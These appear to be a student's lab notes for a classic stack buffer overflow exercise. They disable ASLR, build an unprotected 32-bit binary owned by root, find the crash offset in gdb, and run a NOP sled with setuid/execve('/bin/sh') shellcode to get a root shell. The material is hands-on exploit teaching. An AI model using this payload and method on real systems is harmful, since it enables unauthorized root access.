Practical-2 (Shell Code)

website : https://defendtheweb.net/article/buffer-overflow-to-run-root-shell-full-tutorial

(In Root)
1. Disable ASLR : echo "0" > /proc/sys/kernel/randomize_va_space

(IN USER)
2. make 32-bit executable file :
	g++ shell.cpp -o shell -m32 -fno-stack-protector -z execstack

(IN ROOT)
3.  chown root:root shell (check permission using ls -l)

(IN USER
4. enter string in executable file :
	 ./shell `python2 -c 'print("A"*400)'`

Change Value till segementation fault 

./shell `python2 -c 'print("A"*410)'`  

5. Run previous string in gdb enviorment

gdb -q --args ./shell `python2 -c 'print("A"*410)'`


6. Try to overwrite REG

gdb -q --args ./shell `python2 -c 'print "A"*416 + "BCDE"'`
(check by using x/32z $esp in gdb )

7. Take Payload and run it in gdb

gdb -q --args ./shell `python2 -c 'print "\x90"*359 + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x80\xd4\xff\xff"'`

enter x/32z $esp in gdb and check for 0x90909090

8. Now take one of the 0x90909090 memeory address and add in payload (write in reverse method)

gdb -q --args ./shell `python2 -c 'print "\x90"*359 + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x51\xd1\xff\xff"'`

shell code access 